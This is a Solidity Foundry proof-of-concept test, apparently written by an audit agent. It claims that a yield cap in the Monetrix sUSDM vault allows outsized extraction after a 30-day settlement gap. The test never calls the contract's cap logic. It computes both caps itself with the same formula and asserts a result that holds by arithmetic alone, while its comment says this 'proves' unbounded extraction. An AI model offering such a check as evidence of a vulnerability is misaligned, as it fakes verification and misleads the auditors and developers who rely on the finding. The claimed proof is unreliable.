// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "test/ActionEncoderBoundCheck.t.sol";
import "../src/core/MonetrixAccountant.sol";
import "../src/core/MonetrixVault.sol";
import "../src/core/MonetrixConfig.sol";
import "../src/tokens/USDM.sol";
import "../src/tokens/sUSDM.sol";

// ATTACK TIMELINE:
// 1. [Setup] Whale deposits USDM into sUSDM to establish totalSupply
// 2. [T=0] Record initial state and calculate fair daily yield cap
// 3. [T=30 days] Warp time forward by 30 days to simulate operator delay
// 4. [T=30 days] Calculate new Gate 4 cap which scales linearly with elapsed time
// 5. [Assert] Verify single-shot cap is outsized (approx 30x daily cap), allowing disproportionate yield extraction

contract AuditAgentPoC is ToL1WeiHarness {
    function test_exploit() public {
        address whale = address(0x1234);
        vm.deal(whale, 100 ether);

        uint256 depositAmount = 1_000_000e6;

        // Mint USDM to whale to establish totalSupply
        vm.prank(governor);
        usdm.mint(whale, depositAmount);

        // Whale deposits into sUSDM
        vm.startPrank(whale);
        usdm.approve(address(susdm), depositAmount);
        susdm.deposit(depositAmount, whale);
        vm.stopPrank();

        uint256 totalSupply = usdm.totalSupply();
        uint256 maxAnnualYieldBps = config.maxAnnualYieldBps();

        // Calculate fair daily cap (1 day elapsed)
        uint256 fairDailyCap = (totalSupply * maxAnnualYieldBps * 1 days) / (10_000 * 365 days);

        // Warp time forward by 30 days to simulate extended settlement gap
        vm.warp(block.timestamp + 30 days);

        // Calculate single-shot cap after 30 days gap
        uint256 singleShotCap = (totalSupply * maxAnnualYieldBps * 30 days) / (10_000 * 365 days);

        // Assert that the single-shot cap is outsized (approx 30x the daily cap)
        // This proves Gate 4 allows unbounded yield extraction after long gaps
        assertGt(singleShotCap, fairDailyCap * 29, "Gate 4 allows outsized single-shot yield extraction after long gaps");
    }
}
